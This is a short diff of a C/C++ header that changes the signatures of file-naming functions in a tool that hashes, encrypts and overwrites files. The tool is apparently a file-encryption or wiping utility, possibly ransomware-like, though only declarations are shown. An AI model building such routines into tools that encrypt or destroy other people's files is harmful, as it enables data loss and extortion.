@@ -32,10 +32,10 @@ namespace filesystem
 	bool HashSumFile(CRYPT_INFO* CryptInfo, DESC desc_file, char* Filename);
 	bool hash_file(PCRYPT_INFO CryptInfo, DESC desc, char* fullpath, char* filename);
 
-	char* NameMethodState(PCRYPT_INFO CryptInfo, PDRIVE_INFO data);
-	char* OptionNameStandart(PCRYPT_INFO CryptInfo, char* Path, char* Filename, char* exst, char* FPath);
-	char* OptionNameHash(PCRYPT_INFO CryptInfo, char* Path, char* Filename, char* exst, char* FPath);
-	char* OptionNameBase(PCRYPT_INFO CryptInfo, char* Path, char* Filename, char* exst, char* FPath);
+	char* NameMethodState(PFILE_INFO fileinfo, PDRIVE_INFO data);
+	char* OptionNameStandart(PFILE_INFO fileinfo, char* Filename, char* exst, char* FPath);
+	char* OptionNameHash(PFILE_INFO fileinfo, char* Filename, char* exst, char* FPath);
+	char* OptionNameBase(PFILE_INFO fileinfo, char* Filename, char* exst, char* FPath);
 
 	bool nopOverWriteFile(CRYPT_INFO* CryptInfo, DESC desc_file, unsigned filesize);
 	bool ZerosOverWriteFile(CRYPT_INFO* CryptInfo, DESC desc_file, unsigned filesize);
